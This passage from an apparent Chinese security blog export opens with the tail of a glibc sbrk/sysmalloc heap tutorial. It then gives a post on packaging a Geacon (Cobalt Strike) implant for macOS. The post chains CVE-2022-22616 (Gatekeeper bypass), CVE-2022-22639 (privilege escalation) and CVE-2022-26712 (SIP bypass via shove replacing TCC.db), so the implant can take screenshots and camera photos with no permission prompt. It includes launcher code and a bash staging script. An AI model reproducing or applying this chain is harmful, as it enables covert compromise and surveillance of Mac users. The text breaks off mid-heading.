class="hljs-number">3</span><br>#<span class="hljs-number">1</span>的结果是原来的结束地址<br>#<span class="hljs-number">2</span>执行的结果是和#<span class="hljs-number">1</span>一致的，因为返回的是初始地址<br>#<span class="hljs-number">3</span>这个就是增加后的结束地址了<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br>    <span class="hljs-type">void</span> *p = sbrk(<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before:%p\n&quot;</span>, p);<br>    <br>    p = sbrk(<span class="hljs-number">4096</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sbrk(4096):%p\n&quot;</span>, p);<br><br>    p = sbrk(<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sbrk(0)%p\n&quot;</span>, p);<br><br>    p = sbrk(<span class="hljs-number">4096</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sbrk(4096)%p\n&quot;</span>, p);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><h6 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">else</span>     <span class="hljs-comment">/* av == main_arena */</span><br><br><br>    &#123; <span class="hljs-comment">/* Request enough space for nb + pad + overhead */</span><br>      size = nb + mp_.top_pad + MINSIZE;<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         If contiguous, we can subtract out existing space that we hope to</span><br><span class="hljs-comment">         combine with new space. We add it back later only if</span><br><span class="hljs-comment">         we don&#x27;t actually get contiguous space.</span><br><span class="hljs-comment">       */</span><br><br>      <span class="hljs-keyword">if</span> (contiguous (av))<br>        size -= old_size;<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Round to a multiple of page size.</span><br><span class="hljs-comment">         If MORECORE is not contiguous, this ensures that we only call it</span><br><span class="hljs-comment">         with whole-page arguments.  And if MORECORE is contiguous and</span><br><span class="hljs-comment">         this is not first time through, this preserves page-alignment of</span><br><span class="hljs-comment">         previous calls. Otherwise, we correct to page-align below.</span><br><span class="hljs-comment">       */</span><br><br>      size = ALIGN_UP (size, pagesize);<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         Don&#x27;t try to call MORECORE if argument is so big as to appear</span><br><span class="hljs-comment">         negative. Note that since mmap takes size_t arg, it may succeed</span><br><span class="hljs-comment">         below even if we cannot call MORECORE.</span><br><span class="hljs-comment">       */</span><br><br>      <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>          brk = (<span class="hljs-type">char</span> *) (MORECORE (size));<br>          LIBC_PROBE (memory_sbrk_more, <span class="hljs-number">2</span>, brk, size);<br>        &#125;<br><br>      <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>        &#123;<br>          <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span><br>          <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span>) = atomic_forced_read (__after_morecore_hook);<br>          <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>            (*hook)();<br>        &#125;<br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If have mmap, try using it as a backup when MORECORE fails or</span><br><span class="hljs-comment">             cannot be used. This is worth doing on systems that have &quot;holes&quot; in</span><br><span class="hljs-comment">             address space, so sbrk cannot extend to give contiguous space, but</span><br><span class="hljs-comment">             space is available elsewhere.  Note that we ignore mmap max count</span><br><span class="hljs-comment">             and threshold limits, since the space will not be used as a</span><br><span class="hljs-comment">             segregated mmap region.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-comment">/* Cannot merge with old top, so add its size back in */</span><br>          <span class="hljs-keyword">if</span> (contiguous (av))<br>            size = ALIGN_UP (size + old_size, pagesize);<br><br>          <span class="hljs-comment">/* If we are relying on mmap as backup, then use larger units */</span><br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (MMAP_AS_MORECORE_SIZE))<br>            size = MMAP_AS_MORECORE_SIZE;<br><br>          <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span><br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>            &#123;<br>              <span class="hljs-type">char</span> *mbrk = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<br><br>              <span class="hljs-keyword">if</span> (mbrk != MAP_FAILED)<br>                &#123;<br>                  <span class="hljs-comment">/* We do not need, and cannot use, another sbrk call to find end */</span><br>                  brk = mbrk;<br>                  snd_brk = brk + size;<br><br>                  <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     Record that we no longer have a contiguous sbrk region.</span><br><span class="hljs-comment">                     After the first time mmap is used as backup, we do not</span><br><span class="hljs-comment">                     ever rely on contiguous space since this could incorrectly</span><br><span class="hljs-comment">                     bridge regions.</span><br><span class="hljs-comment">                   */</span><br>                  set_noncontiguous (av);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>      <span class="hljs-keyword">if</span> (brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>        &#123;<br>          <span class="hljs-keyword">if</span> (mp_.sbrk_base == <span class="hljs-number">0</span>)<br>            mp_.sbrk_base = brk;<br>          av-&gt;system_mem += size;<br><br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If MORECORE extends previous space, we can likewise extend top size.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>            set_head (old_top, (size + old_size) | PREV_INUSE);<br><br>          <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)<br>            &#123;<br>              <span class="hljs-comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span><br>              malloc_printerr (<span class="hljs-number">3</span>, <span class="hljs-string">&quot;break adjusted to free malloc space&quot;</span>, brk,<br>       av);<br>            &#125;<br><br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             Otherwise, make adjustments:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           * If the first time through or noncontiguous, we need to call sbrk</span><br><span class="hljs-comment">              just to find out where the end of memory lies.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           * We need to ensure that all returned chunks from malloc will meet</span><br><span class="hljs-comment">              MALLOC_ALIGNMENT</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           * If there was an intervening foreign sbrk, we need to adjust sbrk</span><br><span class="hljs-comment">              request size to account for fact that we will not be able to</span><br><span class="hljs-comment">              combine new space with existing space in old_top.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           * Almost all systems internally allocate whole pages at a time, in</span><br><span class="hljs-comment">              which case we might as well use the whole last page of request.</span><br><span class="hljs-comment">              So we allocate enough more memory to hit a page boundary now,</span><br><span class="hljs-comment">              which in turn causes future contiguous calls to page-align.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              front_misalign = <span class="hljs-number">0</span>;<br>              end_misalign = <span class="hljs-number">0</span>;<br>              correction = <span class="hljs-number">0</span>;<br>              aligned_brk = brk;<br><br>              <span class="hljs-comment">/* handle contiguous cases */</span><br>              <span class="hljs-keyword">if</span> (contiguous (av))<br>                &#123;<br>                  <span class="hljs-comment">/* Count foreign sbrk as system_mem.  */</span><br>                  <span class="hljs-keyword">if</span> (old_size)<br>                    av-&gt;system_mem += brk - old_end;<br><br>                  <span class="hljs-comment">/* Guarantee alignment of first new chunk made from this space */</span><br><br>                  front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;<br>                  <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)<br>                    &#123;<br>                      <span class="hljs-comment">/*</span><br><span class="hljs-comment">                         Skip over some bytes to arrive at an aligned position.</span><br><span class="hljs-comment">                         We don&#x27;t need to specially mark these wasted front bytes.</span><br><span class="hljs-comment">                         They will never be accessed anyway because</span><br><span class="hljs-comment">                         prev_inuse of av-&gt;top (and any chunk created from its start)</span><br><span class="hljs-comment">                         is always true after initialization.</span><br><span class="hljs-comment">                       */</span><br><br>                      correction = MALLOC_ALIGNMENT - front_misalign;<br>                      aligned_brk += correction;<br>                    &#125;<br><br>                  <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     If this isn&#x27;t adjacent to existing space, then we will not</span><br><span class="hljs-comment">                     be able to merge with old_top space, so must add to 2nd request.</span><br><span class="hljs-comment">                   */</span><br><br>                  correction += old_size;<br><br>                  <span class="hljs-comment">/* Extend the end address to hit a page boundary */</span><br>                  end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);<br>                  correction += (ALIGN_UP (end_misalign, pagesize)) - end_misalign;<br><br>                  assert (correction &gt;= <span class="hljs-number">0</span>);<br>                  snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (correction));<br><br>                  <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     If can&#x27;t allocate correction, try to at least find out current</span><br><span class="hljs-comment">                     brk.  It might be enough to proceed without failing.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                     Note that if second sbrk did NOT fail, we assume that space</span><br><span class="hljs-comment">                     is contiguous with first sbrk. This is a safe assumption unless</span><br><span class="hljs-comment">                     program is multithreaded but doesn&#x27;t use locks and a foreign sbrk</span><br><span class="hljs-comment">                     occurred between our first and second calls.</span><br><span class="hljs-comment">                   */</span><br><br>                  <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>                    &#123;<br>                      correction = <span class="hljs-number">0</span>;<br>                      snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      <span class="hljs-comment">/* Call the `morecore&#x27; hook if necessary.  */</span><br>                      <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span>) = atomic_forced_read (__after_morecore_hook);<br>                      <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>                        (*hook)();<br>                    &#125;<br>                &#125;<br><br>              <span class="hljs-comment">/* handle non-contiguous cases */</span><br>              <span class="hljs-keyword">else</span><br>                &#123;<br>                  <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>                    <span class="hljs-comment">/* MORECORE/mmap must correctly align */</span><br>                    assert (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;<br>                      <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)<br>                        &#123;<br>                          <span class="hljs-comment">/*</span><br><span class="hljs-comment">                             Skip over some bytes to arrive at an aligned position.</span><br><span class="hljs-comment">                             We don&#x27;t need to specially mark these wasted front bytes.</span><br><span class="hljs-comment">                             They will never be accessed anyway because</span><br><span class="hljs-comment">                             prev_inuse of av-&gt;top (and any chunk created from its start)</span><br><span class="hljs-comment">                             is always true after initialization.</span><br><span class="hljs-comment">                           */</span><br><br>                          aligned_brk += MALLOC_ALIGNMENT - front_misalign;<br>                        &#125;<br>                    &#125;<br><br>                  <span class="hljs-comment">/* Find out current end of memory */</span><br>                  <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>                    &#123;<br>                      snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));<br>                    &#125;<br>                &#125;<br><br>              <span class="hljs-comment">/* Adjust top based on results of second sbrk */</span><br>              <span class="hljs-keyword">if</span> (snd_brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>                &#123;<br>                  av-&gt;top = (mchunkptr) aligned_brk;<br>                  set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);<br>                  av-&gt;system_mem += correction;<br><br>                  <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     If not the first time through, we either have a</span><br><span class="hljs-comment">                     gap due to foreign sbrk or a non-contiguous region.  Insert a</span><br><span class="hljs-comment">                     double fencepost at old_top to prevent consolidation with space</span><br><span class="hljs-comment">                     we don&#x27;t own. These fenceposts are artificial chunks that are</span><br><span class="hljs-comment">                     marked as inuse and are in any case too small to use.  We need</span><br><span class="hljs-comment">                     two to make sizes and alignments work out.</span><br><span class="hljs-comment">                   */</span><br><br>                  <span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>)<br>                    &#123;<br>                      <span class="hljs-comment">/*</span><br><span class="hljs-comment">                         Shrink old_top to insert fenceposts, keeping size a</span><br><span class="hljs-comment">                         multiple of MALLOC_ALIGNMENT. We know there is at least</span><br><span class="hljs-comment">                         enough space in old_top to do this.</span><br><span class="hljs-comment">                       */</span><br>                      old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;<br>                      set_head (old_top, old_size | PREV_INUSE);<br><br>                      <span class="hljs-comment">/*</span><br><span class="hljs-comment">                         Note that the following assignments completely overwrite</span><br><span class="hljs-comment">                         old_top when old_size was previously MINSIZE.  This is</span><br><span class="hljs-comment">                         intentional. We need the fencepost, even if old_top otherwise gets</span><br><span class="hljs-comment">                         lost.</span><br><span class="hljs-comment">                       */</span><br>      set_head (chunk_at_offset (old_top, old_size),<br>(<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>      set_head (chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ),<br>(<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br><br>                      <span class="hljs-comment">/* If possible, release the rest. */</span><br>                      <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>                        &#123;<br>                          _int_free (av, old_top, <span class="hljs-number">1</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-comment">/* if (av !=  &amp;main_arena) */</span><br></code></pre></td></tr></table></figure><p>最后做一些关于arena的设置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) av-&gt;system_mem &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (av-&gt;max_system_mem))<br>  av-&gt;max_system_mem = av-&gt;system_mem;<br>check_malloc_state (av);<br><br><span class="hljs-comment">/* finally, do the allocation */</span><br>p = av-&gt;top;<br>size = chunksize (p);<br><br><span class="hljs-comment">/* check that one of the above allocation paths succeeded */</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>  &#123;<br>    remainder_size = size - nb;<br>    remainder = chunk_at_offset (p, nb);<br>    av-&gt;top = remainder;<br>    set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head (remainder, remainder_size | PREV_INUSE);<br>    check_malloced_chunk (av, p, nb);<br>    <span class="hljs-keyword">return</span> chunk2mem (p);<br>  &#125;<br><br><span class="hljs-comment">/* catch all failure paths */</span><br>__set_errno (ENOMEM);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>geacon_macos</title>
    <link href="/2023/11/25/geacon-macos/"/>
    <url>/2023/11/25/geacon-macos/</url>
    
    <content type="html"><![CDATA[<h1 id="三个CVE"><a href="#三个CVE" class="headerlink" title="三个CVE"></a>三个CVE</h1><ul><li><p>CVE-2022-22616<br>绕过GateKeeper<br>修复版本macOS12.3</p><blockquote></blockquote><pre><code class="hljs">mkdir -p poc.app/Contents/MacOSecho &quot;#!/bin/bash&quot; &gt; poc.app/Contents/MacOS/pocecho &quot;open -a Calculator&quot; &gt;&gt; poc.app/Contents/MacOS/pocchmod +x poc.app/Contents/MacOS/poczip -r poc.app.zip poc.appgzip -c poc.app.zip &gt; poc.app.zip.gz</code></pre></li><li><p>CVE-2022-22639<br>提权<br>修复版本macOS12.3</p><blockquote></blockquote><pre><code class="hljs">clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Versions/A/SoftwareUpdate.tbd解压 InstallAssistant.gz 到tmp文件夹run /tmp/exploit</code></pre><p>​    </p></li><li><p>CVE-2022-26712<br>绕过SIP<br>修复版本macOS12.4</p><blockquote></blockquote><pre><code class="hljs">sudo /System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/Resources/shove -X /tmp/crafted.db /Library/Application\ Support/com.apple.TCC/TCC.db</code></pre></li></ul><h1 id="一-打包过程"><a href="#一-打包过程" class="headerlink" title="(一)打包过程"></a>(一)打包过程</h1><ol><li>首先是先将geacoon和相关代码进行编译</li><li>准备提权</li><li>准备替换TCC.db</li><li>将上面的步骤封装成一个app，并准备绕过gatekeeper</li></ol><ul><li>下面是整个App的构成，最终的效果是实现Geacon上线，并且能够正常执行Geacon中的相关功能；<br>我们的最终目的是想通过App让我们的Geacon上线，并且正常使用相关功能。所以在Geacon上线之前需要做一些前置工作（比如提权后绕过SIP操作TCC.db，先为我们的Geacon增加一下所需的权限），然后再启动Geacon。</li><li>主要构成</li><li>path<br>由于App可能会被放置到系统的各个位置，为了后面cp程序的正常执行，需要获取App当前所在的位置。因此，path程序做的事情就是获取当前App的位置，并且记录下来。</li><li>cp<br>该程序首先将提权程序elev执行所需的文件和环境构造好，然后启动提权程序</li><li>elev<br>该程序主要作用是以root权限执行一些命令，比如操作TCC.db的shove命令。效果就是在有root的权限基础上，进一步借助root权限执行shove，将系统原有的TCC.db替换掉，新的TCC.db中有我们Geacon程序所需的权限。</li><li>client<br>该程序就是Geacon程序，其中有截图、摄像头拍照功能，在截取屏幕内容和完成拍摄后是需要将图片回传至Cobalt Strike的。截图和调取摄像头都需要用户授予权限后才能使用，为了进一步隐蔽，上面通过借助提权程序和shove来为我们的Geacon程序提供预先设置好的权限。在前置工作完成的基础上，Geacon的功能是能够正常使用的，此时不会弹窗提示用户需要授权。这样Geacon程序是能够藏匿于目标系统中的。</li></ul><p><img src="/2023/11/25/geacon-macos/geacon_app_structure.png" alt="App构成"></p><p>下面这个结构就是自己添加的两个功能，一个是调取摄像头拍照，另一个是用于图片回传；</p><ul><li>关于图片回传的背景<br>之前Geacon里面的功能是面向Windows开发的，其中有些函数的用法并不适用MacOS，比如管道。在Windows下可以不用去了解图片的传输格式，但是在Mac中由于之前的功能不适用所以会导致传输图片失败，这样就必须去了解图片的发送格式，然后自己再手动构造一个包就行，这个用于构造传输图片的包的功能实现在ding模块里。</li></ul><p>这个源于一开始要实现截取屏幕内容并且回传，最初能截图但是图片却不能传回来，所以才进行了一个图片格式包的逆向。</p><ul><li>调取Macbook摄像头进行拍照<br>有了上面传输图片的基本功能后，可以进一步拓展。<br>当我们能调取摄像头进行拍照后，将其存为图片，继而可以将图片回传。</li></ul><p><img src="/2023/11/25/geacon-macos/geacon_func_structure.png" alt="功能构成"></p><h1 id="二-总体的大致实现流程"><a href="#二-总体的大致实现流程" class="headerlink" title="(二)总体的大致实现流程"></a>(二)总体的大致实现流程</h1><h2 id="App的可执行文件"><a href="#App的可执行文件" class="headerlink" title="App的可执行文件"></a>App的可执行文件</h2><p>下面代码做的事情：</p><ul><li>一个是将当前App路径记录下来，写进path文件里；</li><li>然后执行cp脚本</li><li>最后执行client程序</li></ul><blockquote><p>#import &lt;Foundation&#x2F;Foundation.h&gt;<br>    int main(int argc, const char * argv[]){</p></blockquote><pre><code class="hljs">    NSBundle *myBundle = [NSBundle mainBundle];    NSString *str = [myBundle bundlePath];//app path    NSString *path2file = [str stringByAppendingString:@&quot;/Contents/Resources/path&quot;];//write path to file    [str writeToFile:path2file atomically:TRUE encoding:NSUTF8StringEncoding error:nil];    NSString *str1 = [str stringByAppendingString:@&quot;/Contents/Resources/cp&quot;];//bash script path    NSLog(@&quot;%@&quot;,str);    NSTask *task = [[NSTask alloc] init];    NSArray *arguments = @[str];    [task setLaunchPath:str1];    [task setArguments:arguments];    [task launch];//run script    [task waitUntilExit];        NSTask *client = [[NSTask alloc] init];    [client setLaunchPath:@&quot;/tmp/client&quot;];    [client launch];    return 0;&#125;</code></pre><h2 id="cp脚本，用来准备执行提权程序"><a href="#cp脚本，用来准备执行提权程序" class="headerlink" title="cp脚本，用来准备执行提权程序"></a>cp脚本，用来准备执行提权程序</h2><p>下面的脚本是用来执行提权程序</p><blockquote></blockquote><pre><code class="hljs">#!/bin/bashpath1=$1path2=&quot;/Contents/Resources/InstallAssistant.gz&quot;path3=&quot;/Contents/Resources/elev&quot;path4=&quot;/Contents/Resources/Applications&quot;path5=&quot;/Contents/Resources/crafted.db&quot;path7=&quot;/Contents/Resources/client&quot;path=$&#123;path1&#125;$&#123;path2&#125;echo $&#123;path&#125;tar -xzvf $&#123;path&#125; -C $&#123;path1&#125;/Contents/Resources/echo &quot;decompress over&quot;mv -f $&#123;path1&#125;$&#123;path4&#125; /tmp/cp -f $&#123;path1&#125;$&#123;path3&#125; /tmp/cp -f $&#123;path1&#125;$&#123;path5&#125; /tmp/cp -f $&#123;path1&#125;$&#123;path7&#125; /tmp/echo &quot;mv over&quot;/tmp/elev &amp;sleep 1</code></pre><h2 id="提权程序，可以将需要提权的代码执行放到这里执行"><a href="#提权程序，可以将需要提权的代码执行放到这里执行" class="headerlink" 